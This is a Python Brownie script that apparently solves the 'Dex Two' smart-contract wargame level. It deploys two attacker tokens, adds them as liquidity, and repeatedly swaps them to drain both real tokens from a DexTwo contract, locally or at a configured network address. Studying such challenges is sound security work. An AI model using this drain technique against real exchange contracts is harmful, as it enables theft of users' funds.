from brownie import Contract, Attack, DexTwo, Token1, Token2, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        token1 = Token1.deploy({"from": get_account(index=1)})
        token2 = Token2.deploy({"from": get_account(index=1)})

        dex = DexTwo.deploy(token1, token2, {"from": get_account(index=1)})

        token1.transfer(dex, 100, {"from": get_account(index=1)}).wait(1)
        token1.transfer(account, 10, {"from": get_account(index=1)}).wait(1)
        token2.transfer(dex, 100, {"from": get_account(index=1)}).wait(1)
        token2.transfer(account, 10, {"from": get_account(index=1)}).wait(1)

        attack1 = Attack.deploy({"from": account})
        attack2 = Attack.deploy({"from": account})

        token1.approve(dex, 10000, {"from": account}).wait(1)
        token2.approve(dex, 10000, {"from": account}).wait(1)

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        dex = Contract.from_abi(
            DexTwo._name,
            config["networks"][network.show_active()]["dex"],
            DexTwo.abi,
        )

        attack1 = Attack.deploy({"from": account})
        attack2 = Attack.deploy({"from": account})

    attack1.approve(dex, 10000, {"from": account}).wait(1)
    attack2.approve(dex, 10000, {"from": account}).wait(1)

    dex.add_liquidity(attack1, 100, {"from": account}).wait(1)
    dex.add_liquidity(attack2, 100, {"from": account}).wait(1)

    while dex.balanceOf(dex.token1(), dex) > 0:

        dex.swap(
            attack1,
            dex.token1(),
            dex.balanceOf(dex.token1(), dex),
            {"from": account},
        ).wait(1)

    while dex.balanceOf(dex.token2(), dex) > 0:

        dex.swap(
            attack2,
            dex.token2(),
            dex.balanceOf(dex.token2(), dex),
            {"from": account},
        ).wait(1)

    print(f"Dex token1 balance is {dex.balanceOf(dex.token1(), dex)}")
    print(f"Dex token2 balance is {dex.balanceOf(dex.token2(), dex)}")


def main():
    attack()
